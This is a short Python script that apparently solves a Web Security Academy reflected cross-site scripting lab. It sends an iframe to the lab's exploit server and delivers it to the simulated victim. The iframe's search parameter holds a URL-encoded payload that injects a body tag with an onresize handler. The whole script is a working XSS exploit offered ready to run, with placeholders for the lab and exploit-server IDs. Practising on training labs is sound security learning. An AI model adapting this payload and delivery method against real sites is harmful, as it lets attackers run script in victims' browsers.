import requests
import webbrowser


exploit_server = 'https://exploit-serverID.exploit-server.net/' # Replace with your actual Exploit Server ID
lab_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = "%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>"

data = {
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8",
    "responseBody": f"<iframe src=\"{lab_url}?search={payload}",
    "formAction": "DELIVER_TO_VICTIM"
}

response = requests.post(url=exploit_server, data=data)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(exploit_server)
    webbrowser.open(exploit_server)
else:
    print("Something went wrong.")
